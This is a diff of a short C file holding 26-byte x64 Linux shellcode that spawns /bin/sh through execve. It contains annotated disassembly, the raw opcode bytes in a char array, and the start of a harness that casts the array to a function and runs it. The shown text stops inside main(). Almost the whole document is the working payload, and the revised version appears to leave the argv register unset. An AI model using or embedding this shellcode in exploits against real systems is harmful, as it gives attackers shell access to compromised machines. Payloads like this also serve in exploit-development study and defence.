@@ -1,24 +1,26 @@
 #include <stdio.h>
 
-/*
+/* 
 
-x64 execve /bin/sh -- 26 Bytes -- 12FEB017 -- icon
+x64 execve /bin/sh -- 26 Bytes -- 7MAY017 -- icon
 
-0:  48 31 f6                xor    rsi,rsi
-3:  48 89 f2                mov    rdx,rsi
-6:  56                      push   rsi
-7:  48 b8 2f 62 69 6e 2f    movabs rax,0x68732f2f6e69622f
-e:  2f 73 68
-11: 50                      push   rax
-12: 48 89 e7                mov    rdi,rsp
-15: 6a 3b                   push   0x3b
-17: 58                      pop    rax
+0:  31 c0                   xor    eax,eax
+2:  48 89 c2                mov    rdx,rax
+5:  50                      push   rax
+6:  48 b9 2f 62 69 6e 2f    movabs rcx,0x68732f2f6e69622f
+d:  2f 73 68
+10: 51                      push   rcx
+11: 48 89 e7                mov    rdi,rsp
+14: 50                      push   rax
+15: 57                      push   rdi
+16: b0 3b                   mov    al,0x3b
 18: 0f 05                   syscall
 */
 
 char execve_sh[] = \
-"\x48\x31\xF6\x48\x89\xF2\x56\x48\xB8\x2F\x62\x69\x6E"
-"\x2F\x2F\x73\x68\x50\x48\x89\xE7\x6A\x3B\x58\x0F\x05";
+"\x31\xC0\x48\x89\xC2\x50\x48\xB9\x2F\x62\x69\x6E\x2F"
+"\x2F\x73\x68\x51\x48\x89\xE7\x50\x57\xB0\x3B\x0F\x05";
+
 
 int main(int argc, char **argv){
   int (*test)() = (int(*)())execve_sh;
